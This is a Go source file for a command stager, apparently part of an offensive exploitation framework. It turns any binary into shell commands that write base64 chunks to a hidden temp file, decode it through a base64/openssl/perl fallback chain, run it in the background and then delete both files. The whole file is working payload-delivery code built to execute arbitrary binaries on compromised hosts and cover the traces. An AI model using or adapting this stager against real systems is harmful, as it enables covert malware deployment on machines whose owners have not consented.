package cmdstager

import (
	"encoding/base64"
	"fmt"
)

// decodeChain is a portable base64 decoder fallback chain.
// Tries multiple tools in order until one succeeds.
const decodeChain = `(which base64 >&2 && base64 -d) || ` +
	`(which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || ` +
	`(which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')`

// Bourne encodes a binary as base64 chunks with a portable decoder.
// Returns a list of shell commands: echo chunks to .b64 file, decode, chmod, exec, cleanup.
func Bourne(binary []byte, opts Options) []string {
	lineMax := opts.lineMax()
	encoded := base64.StdEncoding.EncodeToString(binary)
	b64Path := opts.TempPath + ".b64"

	// echo -n '...' >> '/tmp/.pXrT4k.b64'
	prefix := "echo -n '"
	suffix := fmt.Sprintf("'>>%s", b64Path)
	overhead := len(prefix) + len(suffix)
	chunkSize := max(lineMax-overhead, 4)

	var commands []string
	for i := 0; i < len(encoded); i += chunkSize {
		end := min(i+chunkSize, len(encoded))
		commands = append(commands, prefix+encoded[i:end]+suffix)
	}

	// Decode base64 to binary using portable fallback chain
	commands = append(commands,
		fmt.Sprintf("(%s) 2>/dev/null >%s <%s", decodeChain, opts.TempPath, b64Path),
		fmt.Sprintf("chmod +x %s", opts.TempPath),
		fmt.Sprintf("%s &", opts.TempPath),
		fmt.Sprintf("rm -f %s %s", opts.TempPath, b64Path),
	)

	return commands
}
